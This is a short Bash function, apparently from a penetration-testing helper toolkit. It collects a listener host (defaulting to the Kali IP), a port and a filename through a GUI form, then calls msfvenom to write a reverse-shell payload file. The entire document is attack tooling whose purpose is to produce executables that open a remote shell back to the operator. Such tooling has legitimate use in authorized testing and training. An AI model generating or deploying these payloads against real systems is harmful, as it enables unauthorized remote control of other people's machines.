#!/bin/bash

create_reverse_shell() {
    local PAYLOAD="${1}"
    local FORMAT="${2}"
    local FILENAME="${3}"
    local LPORT="${4:-1337}"

    # Generate GUI form items (label, type (optional: default text), name, default (optional))
    LHOST_FIELD=$(form_item  "LHOST"  "lhost" "${KALI_IP}")
    LPORT_FIELD=$(form_item  "LPORT" "number" "lport" "${LPORT}")
    FILENAME_FIELD=$(form_item  "filename" "text" "filename" "${FILENAME}")

    # Generate GUI form
    generate_form "${LHOST_FIELD}" "${LPORT_FIELD}" "${FILENAME_FIELD}" 

    LHOST=${form_data["lhost"]}
    LPORT=${form_data["lport"]}
    FILENAME=${form_data["filename"]}

    execute_command "msfvenom -p ${PAYLOAD} LHOST=${LHOST} LPORT=${LPORT} -f ${FORMAT} -o ${FILENAME}"
    create_new_line
}
